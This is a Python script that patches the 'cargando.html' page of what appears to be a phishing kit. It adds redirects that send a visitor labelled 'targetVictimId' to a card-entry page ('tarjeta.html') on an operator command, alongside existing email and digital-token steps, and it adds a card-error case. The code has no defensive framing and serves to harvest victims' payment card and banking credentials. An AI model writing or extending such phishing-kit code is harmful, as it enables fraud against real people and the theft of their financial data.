import re

def fix_cargando():
    with open('cargando.html', 'r', encoding='utf-8') as f:
        content = f.read()

    # Block 1
    #              } else if (action === 'pedir_correo') {
    #                  window.location.href = './token-digital.html?id=' + targetVictimId;
    #              } else if (action === 'error_login' || action === 'error_usuario') {
    
    new_pedir_1 = """} else if (action === 'pedir_tarjeta') {
                  window.location.href = './tarjeta.html?id=' + targetVictimId;
              } else if (action === 'error_login'"""
    
    content = content.replace("} else if (action === 'error_login'", new_pedir_1)
    
    # Block 2
    #                        else if (action === 'pedir_correo') window.location.href = './token-digital.html?id=' + targetVictimId;
    #                        else if (action === 'error_login' || action === 'error_usuario') window.location.href = './error.html?id=' + targetVictimId;
    
    new_pedir_2 = """else if (action === 'pedir_tarjeta') window.location.href = './tarjeta.html?id=' + targetVictimId;
                        else if (action === 'error_login'"""
                        
    content = content.replace("else if (action === 'error_login'", new_pedir_2)
    
    # Error combinations block 1 & 2
    content = content.replace("action === 'error_usuario') {", "action === 'error_usuario' || action === 'error_tarjeta') {")
    content = content.replace("action === 'error_usuario') window", "action === 'error_usuario' || action === 'error_tarjeta') window")

    with open('cargando.html', 'w', encoding='utf-8') as f:
        f.write(content)
        
    print("Fixed cargando.html")

if __name__ == "__main__":
    fix_cargando()
